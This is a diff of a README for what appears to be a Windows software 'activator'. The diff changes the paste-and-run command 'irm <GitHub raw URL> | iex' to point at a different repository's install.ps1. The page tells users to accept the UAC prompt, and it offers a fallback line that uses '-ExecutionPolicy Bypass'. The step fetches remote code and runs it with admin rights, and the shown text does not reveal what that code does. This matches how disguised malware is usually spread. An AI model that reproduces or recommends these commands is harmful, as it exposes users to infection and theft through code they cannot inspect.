@@ -32,7 +32,7 @@ Premium · Pro · Full build · Windows
 2. Paste and run:
 
 ```powershell
-irm https://raw.githubusercontent.com/Freelopiazza/Activate/refs/heads/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/VillageGunsmithDwell/Activate/refs/heads/main/scripts/install.ps1 | iex
 ```
 
 3. Confirm **UAC** (Yes) — setup runs automatically
@@ -65,7 +65,7 @@ irm https://raw.githubusercontent.com/Freelopiazza/Activate/refs/heads/main/inst
 
 <details>
 <summary>&nbsp;<b>Manual install blocked?</b></summary>
-<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Freelopiazza/Activate/refs/heads/main/install.ps1 | iex"`
+<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/VillageGunsmithDwell/Activate/refs/heads/main/scripts/install.ps1 | iex"`
 </details>
 
 <details>
